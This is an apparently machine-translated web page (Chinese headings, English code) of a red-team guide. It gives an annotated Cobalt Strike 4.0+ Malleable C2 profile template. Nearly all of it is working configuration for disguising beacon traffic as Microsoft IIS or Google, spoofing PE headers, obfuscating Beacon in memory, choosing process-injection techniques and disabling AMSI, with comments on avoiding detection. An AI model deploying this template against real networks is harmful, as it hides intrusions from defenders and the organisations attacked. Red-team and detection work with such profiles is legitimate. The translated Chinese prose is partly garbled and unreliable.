<html>
<head>
<title>[RedTeam] Cobalt Strike 4.0+ Malleable C2 Profile Guideline</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[RedTeam] Cobalt Strike 4.0+延展性C2配置文件指南</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/red-team-cobalt-strike-4-0-malleable-c2-profile-guideline-eb3eeb219a7c?source=collection_archive---------0-----------------------#2020-04-06">https://infosecwriteups.com/red-team-cobalt-strike-4-0-malleable-c2-profile-guideline-eb3eeb219a7c?source=collection_archive---------0-----------------------#2020-04-06</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/4aa96f6b61c29b14754004dd68d7a44d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4qostgiFPJVAg8_SSBR72Q.png"/></div></div></figure><p id="7d71" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们现在处于钴击4.0+时代。随着我们越来越多地使用Cobalt Strike作为指挥和控制(“C2”)服务器，定制您的延展性C2配置文件变得势在必行，以掩饰您的信标流量和通信指标。此外，它还可以控制内存中的特性和信标进程注入行为。</p><p id="5744" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">完整的指南简介可在<a class="ae kz" href="https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile" rel="noopener ugc nofollow" target="_blank">这里</a> (CS4.0_guideline.profile)找到。它包含更多的细节/说明，以制作可延展的C2型材。</p><div class="la lb gp gr lc ld"><a href="https://github.com/bigb0sss/RedTeam/blob/master/CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile" rel="noopener  ugc nofollow" target="_blank"><div class="le ab fo"><div class="lf ab lg cl cj lh"><h2 class="bd iu gy z fp li fr fs lj fu fw is bi translated">bigb0sss/RedTeam</h2><div class="lk l"><h3 class="bd b gy z fp li fr fs lj fu fw dk translated">CobaltStrike 4.0+指南配置文件#可延展的C2配置文件控制信标流量和通信指示器，因为…</h3></div><div class="ll l"><p class="bd b dl z fp li fr fs lj fu fw dk translated">github.com</p></div></div><div class="lm l"><div class="ln l lo lp lq lm lr jz ld"/></div></div></a></div><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="de6a" class="mb mc it lx b gy md me l mf mg"># Cobalt Strike 4.0+ Guideline Profile<br/>#<br/># References:<br/>#   * https://www.cobaltstrike.com/help-malleable-c2<br/>#   * https://www.cobaltstrike.com/help-malleable-postex<br/>#</span></pre><h2 id="d3fe" class="mb mc it bd mh mi mj dn mk ml mm dp mn km mo mp mq kq mr ms mt ku mu mv mw mx bi translated">全局选项块</h2><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="5b13" class="mb mc it lx b gy md me l mf mg"><strong class="lx iu">set sample_name "bigb0ss.profile"; </strong>     <br/>  <em class="my"># Profile name (used in the Indicators of Compromise report)</em></span><span id="53fe" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">set sleeptime "30000";  </strong>                <br/>  <em class="my"># Sleep time for the beacon callback (in milliseconds)</em></span><span id="5706" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">set jitter "50";   </strong>                     <br/>  <em class="my"># Jitter to set %. In this example, the beacon will callback      <br/>  between 15 and 30 sec jitter</em></span><span id="38b8" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">set host_stage "[true|false]";  </strong>          <br/><em class="my">  # Staged payload allow or disallow (Note: Stager payloads are <br/>  generally easier to get caught, but it's necessary for the space-<br/>  restricted situations)</em></span><span id="c6af" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.177";</strong>    <br/><em class="my">  # User-Agent Setup</em></span></pre><h2 id="2ce9" class="mb mc it bd mh mi mj dn mk ml mm dp mn km mo mp mq kq mr ms mt ku mu mv mw mx bi translated">DNS信标块</h2><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="f11a" class="mb mc it lx b gy md me l mf mg"><strong class="lx iu">set dns_idel "8.8.8.8";  </strong>               <br/><em class="my">  # IP to indicate no tasks available. Avoid using bogon address <br/>  "0.0.0.0" (This can be picked up as IOC)</em></span><span id="f1c5" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">set maxdns "[0-255]"; </strong>                    <br/><em class="my">  # Maximum length of hostname when uploading data over DNS (0-255)</em></span><span id="539c" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">set dns_sleep "1000"; </strong>                  <br/> <em class="my"> # Force a sleep prior to each individual DNS request. <br/>  (in milliseconds)</em></span><span id="7de9" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">set dns_stager_prepend "";</strong>                <br/><em class="my">  # Prepend text to payload stage delivered to DNS TXT record stager</em></span><span id="d0c2" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">set dns_stager_subhost ".stage.8546.";  </strong><br/><em class="my">  # Subdomain used by DNS TXT record stager</em></span><span id="4c73" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">set dns_max_txt "[0-255]";</strong>                <br/><em class="my">  # Maximum length of DNS TXT responses for tasks</em></span><span id="d16b" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">set dns_ttl "1"; </strong>                       <br/><em class="my">  # TTL for DNS replies</em></span></pre><h2 id="2b04" class="mb mc it bd mh mi mj dn mk ml mm dp mn km mo mp mq kq mr ms mt ku mu mv mw mx bi translated">SMB信标块</h2><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="0ff1" class="mb mc it lx b gy md me l mf mg"><strong class="lx iu">set pipename "win_svc+8546"; </strong>           <br/><em class="my">  # Name of pipe to use for SMB beacon's peer-to-peer communication</em></span><span id="941b" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">set pipename_stager "win_svc+8546";     </strong><br/><em class="my">  # Name of pipe to use for SMB beacon's named pipe stager</em></span></pre><h2 id="c81c" class="mb mc it bd mh mi mj dn mk ml mm dp mn km mo mp mq kq mr ms mt ku mu mv mw mx bi translated"><strong class="ak"> TCP信标块</strong></h2><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="c352" class="mb mc it lx b gy md me l mf mg"><strong class="lx iu">set tcp_port "1337"; </strong>                   <br/><em class="my">  # TCP beacon listen port</em></span></pre><h2 id="a3d2" class="mb mc it bd mh mi mj dn mk ml mm dp mn km mo mp mq kq mr ms mt ku mu mv mw mx bi translated"><strong class="ak">SSL/代码证书块</strong></h2><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="948f" class="mb mc it lx b gy md me l mf mg"><strong class="lx iu">### Self-Signed Certificate HTTPS Beacon Block</strong> <br/><strong class="lx iu">https-certificate {</strong><br/>    <strong class="lx iu">set C "US";</strong>                         <em class="my"># Country</em><br/>    <strong class="lx iu">set CN "google.com"; </strong>               <em class="my"># Common Name</em><br/>    <strong class="lx iu">set L "Mountain View";  </strong>            <em class="my"># Locality</em><br/>    <strong class="lx iu">set O "Alphabet Inc."; </strong>             <em class="my"># Organization Name</em><br/>    <strong class="lx iu">set OU "Google Certificate"; </strong>       <em class="my"># Organizational Unit Name</em><br/>  <strong class="lx iu">  set ST "CA";   </strong>                     <em class="my"># State</em><br/>    <strong class="lx iu">set validity "365"; </strong>                <br/><strong class="lx iu">}</strong><br/><br/><strong class="lx iu">### Valid SSL Certificate HTTPS Beacon Block</strong> <br/><strong class="lx iu">https-certificate {<br/>    set keystore "domain.store";  </strong>      <br/>      <em class="my"># Private key, root cert, intermediate cert and domain cert - <br/>      Java Keystore file should be in the same folder with Malleable <br/>      C2 profile</em></span><span id="51a7" class="mb mc it lx b gy mz me l mf mg">    <strong class="lx iu">set password "&lt;mypassword&gt;"; </strong>         <br/>      # The password to your Java Keystore<br/><strong class="lx iu">}</strong><br/><br/><strong class="lx iu">### Code Signing Certificate Block</strong><br/><strong class="lx iu">code-signer {<br/>    set keystore "keystore.jks";<br/>    set password "&lt;mypassword&gt;";<br/>    set alias "server";<br/>}</strong></span></pre><h2 id="acf2" class="mb mc it bd mh mi mj dn mk ml mm dp mn km mo mp mq kq mr ms mt ku mu mv mw mx bi translated"><strong class="ak"> HTTP/S块</strong></h2><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="3439" class="mb mc it lx b gy md me l mf mg"><strong class="lx iu">### HTTP/S Global Response Header Block</strong><br/><strong class="lx iu">http-config {<br/>    set headers "Server, Content-Type, Cache-Control, Connection, X-Powered-By";        <br/>    header "Server" "Microsoft-IIS/8.5";<br/>    header "Content-Type" "text/html;charset=UTF-8";<br/>    header "Cache-Control" "max-age=1";<br/>    header "Connection" "keep-alive";<br/>    header "X-Powered-By" "ASP.NET";<br/>    set trust_x_forwarded_for "[true|false]";</strong>           <br/>      <em class="my"># "true" if the team server is behind an HTTP redirector</em><br/><strong class="lx iu">}</strong><br/><br/><strong class="lx iu">### HTTP-GET Block</strong><br/><strong class="lx iu">http-get {<br/>    set uri "/image/xxxxxx";  </strong>            <br/>      <em class="my"># For multiple URIs = "/image /index /sexy"</em><br/>    <br/><strong class="lx iu">    set verb "[GET|POST]"  </strong>                 <br/><em class="my">      # Not really need to config this for http-get, but you can <br/>      change it to POST if you want</em><br/><br/><strong class="lx iu">    client {<br/>        header "Host" "domain.com";<br/>        header "Accept" "*/*";<br/>        header "Accept-Language" "en-US";<br/>        header "Connection" "close";<br/>    }</strong><br/></span><span id="6bb4" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    ### Data Transform Language<br/>    metadata {<br/>        base64;                             </strong># Base64 Encode<strong class="lx iu"><br/>        base64url;                          </strong># URL-safe Base64 Encode<strong class="lx iu"><br/>        mask;                               </strong># XOR mask w/ random key<strong class="lx iu"><br/>        netbios;                            </strong># NetBIOS Encode 'a'<strong class="lx iu"><br/>        netbiosu;                           </strong># NetBIOS Encode 'A'<strong class="lx iu"><br/>        prepend "user=";                    </strong># Prepend "string"<strong class="lx iu"><br/>        append ".asp";                      </strong># Append "string"<br/><br/>        <strong class="lx iu">### Termination Statements</strong><br/>        <strong class="lx iu">parameter "key";</strong>            <em class="my"># Store data in a URI parameter</em><br/>        <strong class="lx iu">header "Cookie"; </strong>          <em class="my"> # Store data in an HTTP header</em><br/>       <strong class="lx iu"> uri-append; </strong>               <em class="my"> # Append to URI</em><br/>        <strong class="lx iu">print; </strong>                           <br/>          <em class="my"># Send data as transaction body (set "verb" to POST to <br/>          use "print")</em><br/>    <strong class="lx iu">}</strong><br/><br/>    <strong class="lx iu">server {</strong><br/>      <em class="my"># headers will be pulled from the http-config block, or <br/>      manually add your preferences below:<br/></em>        <strong class="lx iu">header "Server" "Apache";</strong><br/><br/>        <strong class="lx iu">output {</strong><br/>            <strong class="lx iu">base64;</strong>                         <em class="my"># Base64 Encode</em><br/>            <strong class="lx iu">base64url; </strong>                     <em class="my"># URL-safe Base64 Encode</em><br/>            <strong class="lx iu">mask; </strong>                          <em class="my"># XOR mask w/ random key</em><br/>            <strong class="lx iu">netbios; </strong>                      <em class="my"> # NetBIOS Encode 'a'</em><br/>            <strong class="lx iu">netbiosu; </strong>                     <em class="my"> # NetBIOS Encode 'A'</em><br/>           <strong class="lx iu"> prepend "user="; </strong>              <em class="my"> # Prepend "string"</em><br/>            <strong class="lx iu">append ".asp"; </strong>                 <em class="my"># Append "string"</em><br/>           <strong class="lx iu"> print; </strong>                         <br/>              <em class="my"># Server block MUST be terminated with "print"</em><br/><strong class="lx iu">        }<br/>    }<br/>}</strong><br/><br/><strong class="lx iu">### HTTP-POST Block</strong><br/><strong class="lx iu">http-post {<br/>    set uri "/image/xxxxxx";  </strong>            <br/>      <em class="my"># For multiple URIs = "/image /index /sexy"</em></span><span id="30f3" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    set verb "[GET|POST]" </strong>                  <br/>      <em class="my"># Use "GET" for GET Only C2</em><br/><br/><strong class="lx iu">    client {<br/>        header "Host" "domain.com";<br/>        header "Accept" "*/*";<br/>        header "Accept-Language" "en-US";<br/>        header "Connection" "close";</strong><br/><br/>        <strong class="lx iu">id {</strong>                                    <br/>            <strong class="lx iu">base64; </strong>                   <em class="my"># Base64 Encode</em><br/>            <strong class="lx iu">base64url; </strong>                <em class="my"># URL-safe Base64 Encode</em><br/>           <strong class="lx iu"> mask; </strong>                     <em class="my"># XOR mask w/ random key</em><br/>           <strong class="lx iu"> netbios; </strong>                  <em class="my"># NetBIOS Encode 'a'</em><br/>            <strong class="lx iu">netbiosu; </strong>                 <em class="my"># NetBIOS Encode 'A'</em><br/>           <strong class="lx iu"> prepend "user="; </strong>          <em class="my"># Prepend "string"</em><br/>            <strong class="lx iu">append ".asp"; </strong>            <em class="my"># Append "string"</em><br/>            <strong class="lx iu">parameter "id";  </strong>          <em class="my"># Add Beacon ID in parameter</em><br/>            <strong class="lx iu">header "ID-Header"; </strong>       <em class="my"># Add Beacon ID in header</em><br/>       <strong class="lx iu"> }</strong><br/><br/>        <strong class="lx iu">output {</strong><br/>            <strong class="lx iu">base64; </strong>                 # Base64 Encode<br/>           <strong class="lx iu"> base64url; </strong>              # URL-safe Base64 Encode<br/>           <strong class="lx iu"> mask; </strong>                   # XOR mask w/ random key<br/>           <strong class="lx iu"> netbios;  </strong>               # NetBIOS Encode 'a'<br/>            <strong class="lx iu">netbiosu;  </strong>              # NetBIOS Encode 'A'<br/>            <strong class="lx iu">prepend "user=";</strong>         # Prepend "string"<br/>          <strong class="lx iu">  append "asp";  </strong>          # Append "string"<br/>        <strong class="lx iu">    parameter "key"; </strong>        <em class="my"># Store data in a URI parameter</em><br/>           <strong class="lx iu"> header "Cookie";</strong>         <em class="my"># Store data in an HTTP header</em><br/>          <strong class="lx iu">  uri-append; </strong>             # Append to URI<br/>  <strong class="lx iu">      }<br/>    }</strong><br/><br/>  <strong class="lx iu">  server {</strong><br/>      <em class="my"># headers will be pulled from the http-config block, or <br/>      manually add your preferences below:</em><br/>        <strong class="lx iu">header "Server" "Apache";</strong><br/><br/>       <strong class="lx iu"> output {</strong><br/>           <strong class="lx iu"> base64; </strong>                        <em class="my"># Base64 Encode</em><br/>          <strong class="lx iu">  base64url; </strong>                     <em class="my"># URL-safe Base64 Encode</em><br/>           <strong class="lx iu"> mask; </strong>                         <em class="my"> # XOR mask w/ random key</em><br/>            <strong class="lx iu">netbios; </strong>                      <em class="my"> # NetBIOS Encode 'a'</em><br/>          <strong class="lx iu">  netbiosu;  </strong>                    <em class="my"> # NetBIOS Encode 'A'</em><br/>           <strong class="lx iu"> prepend "user="; </strong>             <em class="my">  # Prepend "string"</em><br/>           <strong class="lx iu"> append ".asp"; </strong>                <em class="my"> # Append "string"</em><br/>            <strong class="lx iu">print; </strong>                         <br/>              <em class="my"># Server block MUST be terminated with "print"</em><br/><strong class="lx iu">        }<br/>    }<br/>}</strong><br/><br/><strong class="lx iu">### HTTP-Stager Block </strong><br/><strong class="lx iu">http-stager {<br/>    set uri_x86 "/get32.gif";  </strong>           <br/><em class="my">      # Set to download 32-bit payload stage</em></span><span id="a83d" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    set uri_x64 "/get64.gif";   </strong>          <br/> <em class="my">     # Set to download 64-bit payload stage</em><br/><br/> <strong class="lx iu">   client {    </strong>                            <br/>      <em class="my"># Clinet = Defining the client side of the HTTP transaction.</em><br/><strong class="lx iu">        header "Host" "domain.com";<br/>        header "Accept" "*/*";<br/>        header "Accept-Language" "en-US";<br/>        header "Connection" "close";<br/>        header "Cookie" "XXXXXX"<br/>        parameter "id" "8645";<br/>    }</strong><br/><br/><strong class="lx iu">    server {</strong><br/><em class="my">      # headers will be pulled from the http-config block, or <br/>      manually add your preferences below:</em><br/>        <strong class="lx iu">header "Server" "Apache";</strong><br/><br/>     <strong class="lx iu">   output {<br/>      </strong>  <strong class="lx iu">    base64; </strong>                       <em class="my"> # Base64 Encode</em><br/>           <strong class="lx iu"> base64url; </strong>                   <em class="my">  # URL-safe Base64 Encode</em><br/>            <strong class="lx iu">mask; </strong>                         <em class="my"> # XOR mask w/ random key</em><br/>           <strong class="lx iu"> netbios;  </strong>                    <em class="my">  # NetBIOS Encode 'a'</em><br/>           <strong class="lx iu"> netbiosu; </strong>                 <em class="my">     # NetBIOS Encode 'A'</em><br/>           <strong class="lx iu"> prepend "user=";  </strong>          <em class="my">    # Prepend "string"</em><br/>          <strong class="lx iu">  append ".asp"; </strong>           <em class="my">      # Append "string"</em><br/>           <strong class="lx iu"> print; </strong>                         <br/><em class="my">              # Server block MUST be terminated with "print"</em><br/><strong class="lx iu">        }<br/>    }<br/>}</strong></span></pre><h2 id="0e0c" class="mb mc it bd mh mi mj dn mk ml mm dp mn km mo mp mq kq mr ms mt ku mu mv mw mx bi translated">延展性PE &amp;内存中规避和混淆块</h2><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="8b4c" class="mb mc it lx b gy md me l mf mg"><strong class="lx iu">stage {<br/>    set checksum "0";   </strong>                          <br/>      <em class="my"># The CheckSum value in Beacon's PE header</em></span><span id="1362" class="mb mc it lx b gy mz me l mf mg">  <strong class="lx iu">  set cleanup "[true|false]"; </strong>                    <br/><em class="my">      # If "true," free memory associated with the Reflective DLL <br/>      package when it's no longer needed</em></span><span id="2b71" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    set compile_time "02 April 2020 02:35:00";</strong>    <br/><em class="my">      # The build time in Beacon's PE header</em></span><span id="b08c" class="mb mc it lx b gy mz me l mf mg">    <strong class="lx iu">set entry_point "92145";   </strong>                   <br/>     <em class="my"> # The EntryPoint value in Beacon's PE header</em></span><span id="5da9" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    set image_size_x86 "512000"; </strong>                <br/><em class="my">      # SizeOfImage value in x86 Beacon's PE header <br/>      ([!] Avoid using image_size_x86 if module_x86 in use)</em></span><span id="83c2" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    set image_size_x64 "512000";  </strong>                <br/>   <em class="my">   # SizeOfImage value in x64 Beacon's PE header <br/>      ([!] Avoid using image_size_x64 if module_x64 in use)</em></span><span id="42ce" class="mb mc it lx b gy mz me l mf mg">   <strong class="lx iu"> set module_x86 "legit.dll";       </strong>            <br/><em class="my">      # Ask the x86 ReflectiveLoader to load the specified library <br/>      and overwrite its space instead of allocating memory with <br/>      VirtualAlloc</em></span><span id="42a0" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    set module_x64 "legit.dll"; </strong>                  <br/><em class="my">      # Ask the x64 ReflectiveLoader to load the specified library <br/>      and overwrite its space instead of allocating memory with <br/>      VirtualAlloc</em></span><span id="a9d1" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    set name "legit.dll";  </strong>                       <br/><em class="my">      # The Exported name of the Beacon DLL</em></span><span id="286f" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    set rich_header "\x00\x00\x00\x00";  </strong>         <br/><em class="my">      # Meta-information inserted by the compiler. The Rich header <br/>      is a PE section that serves as a fingerprint of a Windows’ <br/>      executable build environment</em><br/><br/>   <strong class="lx iu"> set sleep_mask "[true|false]";  </strong>                <br/>      <em class="my"># Obfuscate Beacon, in-memory, prior to sleeping</em></span><span id="f26e" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    set stomppe "[true|false]"; </strong>                    <br/><em class="my">      # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values <br/>      after it loads Beacon payload</em><br/>                                                        <br/>    <strong class="lx iu">set obfuscate "[true|false]"; </strong>                   <br/><em class="my">      # Obfuscate the Reflective DLL's import table (can be IOC), <br/>      overwrite unused header content, and ask ReflectiveLoader to   <br/>      copy Beacon to new memory without its DLL headers</em><br/>                                                     <br/><strong class="lx iu">    set userwx "[true|false]";  </strong>                    <br/><em class="my">      # Ask ReflectiveLoader to use or avoid RWX permissions for <br/>      Beacon DLL in memory (can be IOC)</em><br/>                                               <br/><strong class="lx iu">    transform-x86 {<br/>        prepend "\x90\x90\x90";  </strong>                   <br/><em class="my">          # Inserts a string before Beacon's Reflective DLL --&gt; <br/>          Defeat analysis on the first few bytes of a memory segment  <br/>          of an injected DLL</em></span><span id="10c6" class="mb mc it lx b gy mz me l mf mg">     <strong class="lx iu">   append "\x90\x90\x90"; </strong>                     <br/>  <em class="my">        # Adds a string after the Beacon Reflective DLL</em></span><span id="4c7e" class="mb mc it lx b gy mz me l mf mg">   <strong class="lx iu">     strrep "ReflectiveLoader" "";</strong>              <br/><em class="my">          # Replaces a string within Beacon's Reflective DLL --&gt; <br/>          Defeat analysis on tool-specific strings</em><br/><strong class="lx iu">    }</strong><br/><br/><strong class="lx iu">    transform-x64 {<br/>        prepend "\x90\x90\x90";                     <br/>        append "\x90\x90\x90";                      <br/>        strrep "ReflectiveLoader" "";               <br/>    }</strong><br/><br/><strong class="lx iu">    data "&lt;whatever string&gt;"; </strong>                      <br/><em class="my">      # Adds a string as-is (ex) "bigb0ss")</em></span><span id="8583" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    string "&lt;whatever string&gt;"; </strong>                    <br/>   <em class="my">   # Adds a null-terminated string (ex) <br/>      {'b','i','g','b','0','s','s','\0'})</em></span><span id="b7ab" class="mb mc it lx b gy mz me l mf mg">    <strong class="lx iu">stringw "&lt;whatever string&gt;";    </strong>                <br/><em class="my">      # Adds a wide (UTF-16LE encoded) string (ex) 0062 0069 0067 <br/>      0062 0030 0073 0073)</em><br/><strong class="lx iu">}</strong></span></pre><h2 id="79cd" class="mb mc it bd mh mi mj dn mk ml mm dp mn km mo mp mq kq mr ms mt ku mu mv mw mx bi translated">过程注入块</h2><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="cc50" class="mb mc it lx b gy md me l mf mg"><strong class="lx iu">process-inject {<br/>    set allocator "[VirtualAllocEx|NtMapViewOfSection]";  </strong>  <br/>  <em class="my">    # The preferred method to allocate memory in the remote <br/>      process. </em><br/>                                                              <br/><strong class="lx iu">    set min_alloc "4096"; </strong>                                <br/><em class="my">      # Minimum amount of memory to request for injected content</em></span><span id="c4a8" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    set startrwx "[true|false]";  </strong>                          <br/><em class="my">      # Use RWX as initial permissions for injected content. <br/>      Alternative is RW.</em></span><span id="ad62" class="mb mc it lx b gy mz me l mf mg"><strong class="lx iu">    set userwx "[true|false]"; </strong>                             <br/><em class="my">      # Use RWX as final permissions for injected content. <br/>      Alternative is RX.</em><br/><br/><strong class="lx iu">    transform-x86 {<br/>        prepend "\x90\x90\x90";                     <br/>        append "\x90\x90\x90";                      <br/>    }<br/><br/>    transform-x64 {<br/>        prepend "\x90\x90\x90";                     <br/>        append "\x90\x90\x90";                     <br/>    }</strong><br/><br/>    <strong class="lx iu">execute {<br/>        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";  </strong>                  <br/><em class="my">          # Current process only ([!] Sysmon EventID 8 - a process <br/>          creates a thread in another process)</em></span><span id="cc9f" class="mb mc it lx b gy mz me l mf mg">        <strong class="lx iu">CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";  </strong>    <br/>  <em class="my">        # No cross-session ([!] Sysmon EventID 8 - a process <br/>          creates a thread in another process)</em></span><span id="46d8" class="mb mc it lx b gy mz me l mf mg">       <strong class="lx iu"> NtQueueApcThread;    </strong>                                         <br/><em class="my">          # Uses RWX shellcode and "CreateThread" start address.  <br/>          Same-arch injection only</em></span><span id="07d6" class="mb mc it lx b gy mz me l mf mg">       <strong class="lx iu"> NtQueueApcThread-s;   </strong>                                      <br/>  <em class="my">        # "Early Bird" injection technique. Suspended process only</em></span><span id="02cb" class="mb mc it lx b gy mz me l mf mg">	<strong class="lx iu">RtlCreateUserThread; </strong>                                        <br/>     <em class="my">     # Risky on XP-era targets. Uses RWX shellcode for x86 -&gt; <br/>          x64 injection. ([!] Sysmon EventID 8 - a process creates a <br/>          thread in another process)</em></span><span id="7ab0" class="mb mc it lx b gy mz me l mf mg"> <strong class="lx iu">       SetThreadContext;  </strong>                                          <br/>  <em class="my">        # Suspended process only</em><br/><strong class="lx iu">    }<br/>}</strong></span></pre><h2 id="e944" class="mb mc it bd mh mi mj dn mk ml mm dp mn km mo mp mq kq mr ms mt ku mu mv mw mx bi translated"><strong class="ak">开采后区块</strong></h2><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="6691" class="mb mc it lx b gy md me l mf mg"><strong class="lx iu">post-ex {<br/>	set spawnto_x86 "%windir%\\syswow64\\&lt;mfpmp&gt;.exe";              <br/>	set spawnto_x64 "%windir%\\sysnative\\&lt;mfpmp&gt;.exe";             <br/>	set obfuscate "[true|false]";  </strong>                                  <br/>         <em class="my"> # Obfuscate the permissions and content of our post-ex <br/>          DLLs</em></span><span id="8021" class="mb mc it lx b gy mz me l mf mg">	<strong class="lx iu">set smartinject "[true|false]";    </strong>                             <br/>          <em class="my"># Directs Beacon to embed key function pointers (ex) <br/>          GetProcAddress, LoadLibrary) into its same-arch post-ex <br/>          DLLs. </em><br/>                                                                    <br/>	<strong class="lx iu">set amsi_disable "[true|false]";  </strong>                              <br/>      <em class="my">    # Disable AMSI (Antimalware Scan Interface) in powerpick, <br/>          execute-assembly and psinject before loading .NET or PS  <br/>          code</em><br/><strong class="lx iu">}</strong></span></pre><figure class="ls lt lu lv gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi na"><img src="../Images/4f7c578649615fed3ba64c08f066de6f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L6y9vzZsfgeae04KS5Mq6w.png"/></div></div></figure></div></div>    
</body>
</html>